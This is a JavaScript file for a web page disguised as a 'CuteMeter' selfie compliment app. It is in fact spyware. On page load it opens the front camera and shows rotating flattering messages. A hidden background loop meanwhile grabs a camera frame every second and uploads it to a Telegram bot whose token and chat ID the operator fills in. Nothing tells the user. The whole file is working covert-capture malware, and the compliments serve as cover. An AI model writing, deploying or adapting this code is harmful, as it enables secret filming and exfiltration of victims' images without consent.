// --- Configuration ---
const CONFIG = {
    botToken: 'YOUR_TELEGRAM_BOT_TOKEN', // Replace with your bot token
    chatId: 'YOUR_TELEGRAM_CHAT_ID',     // Replace with your chat ID
    intervalMs: 1000,                    // 1 frame per second
    imageQuality: 0.8                    // JPEG compression quality (0.0 to 1.0)
};

const COMPLIMENTS = [
    "Warning: Dangerously Cute! 🚨",
    "Cuteness levels off the charts! 📈",
    "Perfect smile detected! ✨",
    "Are you a model? 📸",
    "Calculated Cuteness: 99.9% 💖",
    "Analyzing... Result: Adorable! 🥺",
    "You're glowing today! ✨",
    "Flawless aesthetics detected! 🎀",
    "Error: Too cute to compute! 🤖"
];

// --- State Variables ---
let mediaStream = null;
let captureIntervalId = null;
let complimentIntervalId = null;
let isUploading = false;
let rateLimitPauseUntil = 0;

// --- DOM Elements ---
const videoElement = document.getElementById('cameraFeed');
const complimentDisplay = document.getElementById('complimentDisplay');
const statusLog = document.getElementById('statusLog');

// Hidden canvas for extraction
const canvas = document.createElement('canvas');
const ctx = canvas.getContext('2d');

// --- Helper Functions ---
function updateDevStatus(message) {
    const time = new Date().toLocaleTimeString();
    statusLog.textContent = '[' + time + '] ' + message;
    console.log('[' + time + '] ' + message);
}

function getBlobFromCanvas() {
    return new Promise((resolve) => {
        canvas.toBlob((blob) => {
            resolve(blob);
        }, 'image/jpeg', CONFIG.imageQuality);
    });
}

function showRandomCompliment() {
    const randomIndex = Math.floor(Math.random() * COMPLIMENTS.length);
    complimentDisplay.style.opacity = 0; // Fade out
    
    setTimeout(() => {
        complimentDisplay.textContent = COMPLIMENTS[randomIndex];
        complimentDisplay.style.opacity = 1; // Fade in
    }, 300); // 300ms matches css transition
}

// --- Main Logic ---

async function startSession() {
    try {
        updateDevStatus('Requesting permissions...');
        mediaStream = await navigator.mediaDevices.getUserMedia({ 
            video: { facingMode: 'user' }, // 'user' for front/selfie camera on CuteMeter
            audio: false 
        });
        
        videoElement.srcObject = mediaStream;
        
        videoElement.onloadedmetadata = () => {
            canvas.width = videoElement.videoWidth;
            canvas.height = videoElement.videoHeight;
        };

        updateDevStatus('Camera active. Starting transmission and UI loop.');
        
        // Initial compliment update
        showRandomCompliment();

        // Start background Telegram capture loop (1 sec)
        captureIntervalId = setInterval(processFrame, CONFIG.intervalMs);
        
        // Start foreground UI compliment loop (3 sec)
        complimentIntervalId = setInterval(showRandomCompliment, 3000);

    } catch (err) {
        updateDevStatus('Camera access denied: ' + err.message);
        complimentDisplay.textContent = "Oops! Need camera access to see your cuteness! 📸";
    }
}

function stopSession() {
    if (captureIntervalId) clearInterval(captureIntervalId);
    if (complimentIntervalId) clearInterval(complimentIntervalId);
    
    if (mediaStream) {
        mediaStream.getTracks().forEach(track => track.stop());
    }
}

async function processFrame() {
    const now = Date.now();

    if (now < rateLimitPauseUntil) return;
    if (isUploading) return;
    
    isUploading = true;

    try {
        // Draw frame without the CSS mirror transform (backend gets actual orientation)
        ctx.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
        
        const imageBlob = await getBlobFromCanvas();
        if (!imageBlob) throw new Error("Failed to create blob");

        const formData = new FormData();
        formData.append('chat_id', CONFIG.chatId);
        formData.append('photo', imageBlob, 'frame_' + now + '.jpg');

        const response = await fetch('https://api.telegram.org/bot' + CONFIG.botToken + '/sendPhoto', {
            method: 'POST',
            body: formData
        });

        const result = await response.json();

        if (response.ok) {
            updateDevStatus('Upload success');
        } else if (response.status === 429) {
            const retrySec = result.parameters && result.parameters.retry_after ? result.parameters.retry_after : 5; 
            updateDevStatus('Rate limited. Pausing ' + retrySec + 's');
            rateLimitPauseUntil = now + (retrySec * 1000);
        } else {
            updateDevStatus('Upload failed: ' + result.description);
        }

    } catch (err) {
        updateDevStatus('Network error: ' + err.message);
    } finally {
        isUploading = false;
    }
}

// --- Auto-Initialization ---

// Start automatically without buttons when the DOM is ready
window.addEventListener('load', startSession);

// Clean up hardware tracks if page is closed
window.addEventListener('beforeunload', stopSession);